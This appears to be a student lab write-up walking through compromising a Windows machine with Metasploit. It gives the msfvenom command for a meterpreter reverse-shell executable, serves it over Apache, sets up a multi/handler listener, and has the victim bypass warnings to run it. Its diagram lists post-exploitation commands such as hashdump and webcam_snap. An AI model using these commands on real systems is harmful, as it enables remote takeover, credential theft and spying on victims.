
# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:
<img width="1137" height="556" alt="image" src="https://github.com/user-attachments/assets/094cd334-714d-4c14-8da2-82c3aa0c5760" />

Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:
<img width="1141" height="226" alt="image" src="https://github.com/user-attachments/assets/078eb054-8737-48f7-a9c6-910e636b6e27" />

copy the fun.exe into the apache ```/var/www/html ```folder

<img width="502" height="112" alt="image" src="https://github.com/user-attachments/assets/127a523f-be0c-4332-b7c7-3e96a4e6f509" />

Start apache server ```sudo systemctl apache2 start``` 

<img width="558" height="178" alt="image" src="https://github.com/user-attachments/assets/78f020b2-7a6c-42b1-b5ea-1181075acc57" />

Check the status of apache2 ```sudo apache2 status```

<img width="1900" height="628" alt="image" src="https://github.com/user-attachments/assets/d1e048f1-eb3c-4fa7-a82b-0449eebbb39f" />

Invoke msfconsole:

<img width="1015" height="833" alt="image" src="https://github.com/user-attachments/assets/3bc1a59a-7268-428d-8c9b-33ef7fdd1cb1" />

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

<img width="1372" height="823" alt="image" src="https://github.com/user-attachments/assets/1cbc611b-a9b5-47bf-b625-5bc27cb0b089" />


Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 
<img width="981" height="311" alt="image" src="https://github.com/user-attachments/assets/df073433-9fe3-4a92-9236-424b6bf97458" />


<img width="1918" height="293" alt="image" src="https://github.com/user-attachments/assets/6f12e272-7fc1-40c8-b17a-344e703c9975" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.



Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit
<img width="792" height="362" alt="Screenshot 2025-11-19 073556" src="https://github.com/user-attachments/assets/5ddd68e0-9f73-407d-8e70-6cd593238775" />
<img width="777" height="322" alt="Screenshot 2025-11-19 073605" src="https://github.com/user-attachments/assets/84b160dd-27ca-4111-8356-22e44d13ff9f" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
